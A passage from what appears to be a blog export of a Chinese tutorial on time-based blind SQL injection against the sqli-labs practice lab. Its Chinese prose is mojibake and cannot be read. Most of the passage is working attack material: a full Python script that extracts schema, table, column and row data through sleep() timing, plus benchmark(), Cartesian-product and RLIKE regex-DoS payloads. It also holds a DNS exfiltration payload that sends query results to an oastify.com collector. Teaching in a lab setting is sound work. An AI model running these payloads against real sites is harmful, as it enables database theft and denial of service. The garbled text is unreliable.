class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment">#ä¿®æ”¹payload</span><br><br><br>db_len = <span class="hljs-number">0</span> <span class="hljs-comment">#æ•°æ®åº“çš„é•¿åº¦æ˜¯</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    start = time.time()   <span class="hljs-comment">#è·å–æ‰§è¡Œå‰æ—¶é—´</span><br>    requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(length(schema()) = <span class="hljs-subst">&#123;i&#125;</span>, sleep(2), sleep(0)) --+&quot;</span>)<br>    end = time.time()   <span class="hljs-comment">#è·å–å®Œæˆåçš„æ—¶é—´</span><br>    <span class="hljs-keyword">if</span>(end - start) &gt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;æ•°æ®åº“çš„é•¿åº¦æ˜¯:<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        db_len = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, db_len+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        start = time.time()<br>        requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(substr(schema(), <span class="hljs-subst">&#123;i&#125;</span>, 1) = &#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span>&#x27; , sleep(2), sleep(0)) --+&quot;</span>)<br>        end = time.time()<br>        <span class="hljs-keyword">if</span> (end - start) &gt; <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j).lower(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br> <span class="hljs-comment">#çŒœæµ‹è¡¨çš„é•¿åº¦</span><br>table_len = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>    start = time.time()   <span class="hljs-comment">#è·å–æ‰§è¡Œå‰æ—¶é—´</span><br>    requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(length((select group_concat(TABLE_NAME) from information_schema.TABLES where table_schema = schema()) ) = <span class="hljs-subst">&#123;i&#125;</span>,sleep(2),sleep(0)) --+&quot;</span>)<br>    end = time.time()   <span class="hljs-comment">#è·å–å®Œæˆåçš„æ—¶é—´</span><br>    <span class="hljs-keyword">if</span>(end - start) &gt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\nè¡¨çš„é•¿åº¦æ˜¯ï¼š<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        table_len = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, table_len+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        start = time.time()   <span class="hljs-comment">#è·å–æ‰§è¡Œå‰æ—¶é—´</span><br>        requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where table_schema = schema()),<span class="hljs-subst">&#123;i&#125;</span>,1 )= &#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span>&#x27;,sleep(2),sleep(0)) --+&quot;</span>)<br>        end = time.time()   <span class="hljs-comment">#è·å–å®Œæˆåçš„æ—¶é—´</span><br>        <span class="hljs-keyword">if</span>(end - start) &gt; <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j).lower(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br> <span class="hljs-comment">#çŒœæµ‹åˆ—åé•¿åº¦</span><br>column_len = <span class="hljs-number">0</span><br>table_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;\nè¯·è¾“å…¥è¦æŸ¥è¯¢çš„è¡¨å&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>    start = time.time()   <span class="hljs-comment">#è·å–æ‰§è¡Œå‰æ—¶é—´</span><br>    requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(length ((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema = schema() and table_name = &#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27;) ) = <span class="hljs-subst">&#123;i&#125;</span>,sleep(2),sleep(0)) --+&quot;</span>)<br>    end = time.time()   <span class="hljs-comment">#è·å–å®Œæˆåçš„æ—¶é—´</span><br>    <span class="hljs-keyword">if</span>(end - start) &gt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\nåˆ—çš„é•¿åº¦æ˜¯ï¼š<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        column_len = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, column_len + <span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        start = time.time()   <span class="hljs-comment">#è·å–æ‰§è¡Œå‰æ—¶é—´</span><br>        requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema = schema() and table_name = &#x27;<span class="hljs-subst">&#123;table_name&#125;</span>&#x27;),<span class="hljs-subst">&#123;i&#125;</span>,1) = &#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span>&#x27;,sleep(2),sleep(0)) --+&quot;</span>)<br>        end = time.time()   <span class="hljs-comment">#è·å–å®Œæˆåçš„æ—¶é—´</span><br>        <span class="hljs-keyword">if</span>(end - start) &gt; <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j).lower(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment">#çŒœæµ‹å­—æ®µé•¿åº¦</span><br>data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;\nè¯·è¾“å…¥æ‚¨æƒ³æŸ¥çš„æ•°æ®&#x27;</span>)<br>data_len = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    start = time.time()<br>    requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(length((select group_concat(<span class="hljs-subst">&#123;data&#125;</span>) from <span class="hljs-subst">&#123;table_name&#125;</span>))=<span class="hljs-subst">&#123;i&#125;</span>,sleep(2),sleep(0)) --+&quot;</span>)<br>    end = time.time()<br>    <span class="hljs-keyword">if</span>(end-start)&gt;<span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\n<span class="hljs-subst">&#123;data&#125;</span>çš„é•¿åº¦æ˜¯ï¼š<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        data_len = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,data_len+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        start = time.time()<br>        requests.get(<span class="hljs-string">f&quot;http://127.0.0.22/Less-9/?id=1&#x27; and if(substr((select group_concat(<span class="hljs-subst">&#123;data&#125;</span>) from <span class="hljs-subst">&#123;table_name&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1) =&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span>&#x27;,sleep(2),sleep(0)) --+&quot;</span>)<br>        end = time.time()<br>        <span class="hljs-keyword">if</span>(end-start)&gt;<span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j).lower(),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><h2 id="äºŒã€åŸºäºbenchmark-çš„æ³¨å…¥"><a href="#äºŒã€åŸºäºbenchmark-çš„æ³¨å…¥" class="headerlink" title="äºŒã€åŸºäºbenchmark()çš„æ³¨å…¥"></a>äºŒã€åŸºäºbenchmark()çš„æ³¨å…¥</h2><p>**<code>benchmark(a,b)ï¼š</code>**å°†bé‡å¤æ‰§è¡Œaæ¬¡(é€šè¿‡å¢å¤§aè®©æ•°æ®åº“æ‰§è¡Œå¤šæ¬¡ä¹Ÿä¼šé€ æˆå»¶æ—¶)</p><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; and benchmark(10000,select length(schema())=&#123;1&#125;)--+</span><br></code></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯â€œä¸â€æ¡ä»¶ï¼Œæ‰€ä»¥åªéœ€è¦å˜æ¢1æ¥çŒœè§£æ•°æ®åº“é•¿åº¦å³å¯ï¼Œåªæœ‰æŸ¥è¯¢æ­£ç¡®æ‰ä¼šå»¶æ—¶ã€‚</p><h2 id="ä¸‰ã€æ•°æ®å¤–å¸¦"><a href="#ä¸‰ã€æ•°æ®å¤–å¸¦" class="headerlink" title="ä¸‰ã€æ•°æ®å¤–å¸¦"></a>ä¸‰ã€æ•°æ®å¤–å¸¦</h2><p><strong>æ•°æ®å¤–å¸¦åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ul><li>æ‹¥æœ‰è¯»å†™æƒé™</li><li>Windowsæ“ä½œç³»ç»Ÿ</li></ul><p>åˆ©ç”¨å‡½æ•°ï¼š</p><p><strong><code>load_file()</code> è¯»å–æ–‡ä»¶</strong>â€”&gt;æ‹¬å·å†…éƒ¨å‚æ•°ä¸ºæ‰€è¦è¯»å–çš„æ–‡ä»¶ç›®å½•</p><p><strong><code>concat</code>ï¼šæ‹¼æ¥</strong>ï¼ˆå°†åæ–œæ å’Œåé¢çš„å­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥ï¼‰</p><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">load_file(concat(<span class="hljs-string">&#x27;\\&#x27;</span>,(<span class="hljs-keyword">select</span> version()),<span class="hljs-string">&#x27;.gxh8pxl2n1azosrclm4398nxmosfg4.oastify.com\a.txt&#x27;</span>))<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>.gxh8pxl2n1azosrclm4398nxmosfg4.oastify.com</code>ä¸ºdnslogåœ°å€</p><p>æ³¨æ„ï¼šå¿…é¡»ç»™åœ°å€åé¢åŠ ä»»æ„æ–‡ä»¶ï¼Œå“ªæ€•ä¸å­˜åœ¨ã€‚ç›®çš„æ˜¯ä¸ºäº†è®©æœåŠ¡å™¨å»å‘èµ·è¯·æ±‚</p><h2 id="å››ã€æ„é€ å¤§ç¬›å¡å°”ç§¯è¿›è¡Œæ³¨å…¥"><a href="#å››ã€æ„é€ å¤§ç¬›å¡å°”ç§¯è¿›è¡Œæ³¨å…¥" class="headerlink" title="å››ã€æ„é€ å¤§ç¬›å¡å°”ç§¯è¿›è¡Œæ³¨å…¥"></a>å››ã€æ„é€ å¤§ç¬›å¡å°”ç§¯è¿›è¡Œæ³¨å…¥</h2><p><strong>ç¬›å¡å°”ç®—ç§¯ï¼š</strong></p><p><img src="https://ice.frostsky.com/2023/08/15/07fbb50dd6cdea17b65299760551971c.png" alt="img"></p><p>ä¹Ÿå°±æ˜¯è¯´æ•°å­—1å…ˆå»ä¹˜ä»¥ABCï¼Œç„¶åæ•°å­—2å†å»ä¹˜ä»¥ABCï¼Œç„¶åæ•°å­—3å†å»ä¹˜ä»¥ABCï¼Œå…¶å®å°±æ˜¯Burp suiteé‡Œé¢çš„Intruderæ¨¡å—çš„Attack typeé‡Œé¢çš„Clutser bombæ”»å‡»æ–¹å¼ã€‚</p><p><strong>å¤§è´Ÿè·æŸ¥è¯¢</strong></p><p>Mysqlæ”¯æŒè¿™ç§è¿ç®—æ–¹å¼ï¼Œæˆ‘ä»¬çš„æ€è·¯æ˜¯è®©Mysqlè¿›è¡Œç¬›å¡å°”ç®—ç§¯ä½¿å…¶é€ æˆå¤§è´Ÿè·æŸ¥è¯¢è¾¾åˆ°å»¶æ—¶çš„æ•ˆæœã€‚</p><p>æ—¢ç„¶è¦ç”¨ç¬›å¡å°”ç®—ç§¯å°±è¦éœ€è¦å¤§é¢çš„æ•°å€¼æ¥è®¡ç®—ï¼Œåœ¨mysqlæ•°æ®åº“ä¸­éƒ½æœ‰information_schemaè¿™ä¸ªè¡¨ï¼Œè¿™ä¸ªè¡¨é‡Œé¢çš„æ•°æ®è¿˜æ˜¯è›®å¤šçš„ï¼ŒæŸ¥è¯¢ä¸€ä¸‹æ•°é‡</p><p><img src="https://ice.frostsky.com/2023/08/15/c12ce4f5a4aeee85a865b9dccfea13ce.png" alt="img"></p><p>ç„¶åæˆ‘ä»¬è¿›è¡Œç¬›å¡å°”ç§¯è¿ç®—ï¼Œä¸éš¾å‘ç°æ•°å€¼çš„å¤§å°å½±å“äº†è®¡ç®—çš„é€Ÿåº¦ï¼Œé€šè¿‡é‡‡ç”¨1ä¸ªè¡¨2ä¸ªåˆ—ï¼Œæˆ–è€…2ä¸ªåˆ—ä¸€ä¸ªè¡¨ï¼Œç­‰ç­‰å„ç§ç»„åˆæ‰¾å‡ºåˆé€‚çš„å»¶æ—¶çš„æ—¶é—´ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/15/33ff06817f1d3c0263cf51a89abf6a00.png" alt="img"></p><p>è¿™é‡Œç»™å‡ºpayload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)  <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B,  information_schema.tables C);<br></code></pre></td></tr></table></figure><p>ä½ å®Œå…¨å¯ä»¥æŒ‰ç…§è¿™ä¸ªè§„å¾‹ï¼Œä»Cåé¢åŠ ä¸ªé€—å·ï¼Œå†™Dï¼ŒEç­‰ç­‰ç­‰ï¼Œæƒ³å†™å¤šå°‘å°±å†™å¤šå°‘ï¼Œä½†æ˜¯å†™çš„è¶Šå¤šæŸ¥è¯¢çš„é€Ÿåº¦å°±ä¼šè¶Šæ…¢ï¼Œå¦‚æœåœ¨è¡¨æˆ–è€…åˆ—æ•°é‡å¾ˆå°‘çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å†™çš„å¤šä¸€ç‚¹ã€‚</p><h2 id="äº”ã€æ­£åˆ™DOS-RLIKEæ³¨å…¥"><a href="#äº”ã€æ­£åˆ™DOS-RLIKEæ³¨å…¥" class="headerlink" title="äº”ã€æ­£åˆ™DOS RLIKEæ³¨å…¥"></a>äº”ã€æ­£åˆ™DOS RLIKEæ³¨å…¥</h2><p>å»¶æ—¶åŸç†ï¼Œåˆ©ç”¨SQLå¤šæ¬¡è®¡ç®—æ­£åˆ™æ¶ˆè€—è®¡ç®—èµ„æºäº§ç”Ÿå»¶æ—¶æ•ˆæœï¼Œå…¶å®åŸç†æ˜¯å’Œæˆ‘ä»¬çš„benchmarkæ³¨å…¥å·®ä¸å¤šçš„ã€‚</p><p>åˆ©ç”¨æ‰‹æ³•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">where</span> flag<span class="hljs-operator">=</span>â€™<span class="hljs-number">1</span>â€² <span class="hljs-keyword">and</span> if(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span>â€™sâ€™,concat(rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™)) RLIKE â€˜(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>bâ€™,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>+â€”â€”+</p><p>| flag |</p><p>+â€”â€”+</p><p>| 1  |</p><p>+â€”â€”+</p><p>1 row in set (0.00 sec)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">where</span> flag<span class="hljs-operator">=</span>â€™<span class="hljs-number">1</span>â€² <span class="hljs-keyword">and</span> if(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span>â€™râ€™,concat(rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,â€™aâ€™)) RLIKE â€˜(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>(a.<span class="hljs-operator">*</span>)<span class="hljs-operator">+</span>cdâ€™,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>Empty set (3.83 sec)</p>]]></content>
    
    
    <categories>
      
      <category>åŸºç¡€æ¼æ´</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
